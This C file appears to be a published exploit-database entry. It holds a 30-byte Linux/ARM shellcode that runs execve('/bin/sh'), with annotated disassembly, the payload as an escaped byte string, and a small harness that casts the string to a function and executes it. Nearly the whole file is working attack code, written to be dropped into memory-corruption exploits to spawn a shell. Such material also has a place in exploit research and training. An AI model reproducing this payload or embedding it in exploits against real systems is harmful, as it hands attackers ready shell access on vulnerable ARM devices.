/*
Title:     Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 30 bytes
Date:      2012-09-08
Tested on: ARM1176JZF-S (v6l)
Author:    midnitesnake

00008054 <_start>:
    8054:       e28f6001        add     r6, pc, #1
    8058:       e12fff16        bx      r6
    805c:       4678            mov     r0, pc
    805e:       300a            adds    r0, #10
    8060:       9001            str     r0, [sp, #4]
    8062:       a901            add     r1, sp, #4
    8064:       1a92            subs    r2, r2, r2
    8066:       270b            movs    r7, #11
    8068:       df01            svc     1
    806a:       2f2f            .short  0x2f2f
    806c:       2f6e6962        .word   0x2f6e6962
    8070:       00006873        .word   0x00006873
*/
#include <stdio.h>

char *SC =      "\x01\x60\x8f\xe2"
                "\x16\xff\x2f\xe1"
                "\x78\x46"
                "\x0a\x30"
                "\x01\x90"
                "\x01\xa9"
                "\x92\x1a"
                "\x0b\x27"
                "\x01\xdf"
                "\x2f\x2f"
                "\x62\x69"
                "\x6e\x2f"
                "\x73\x68\x00\x00";

int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}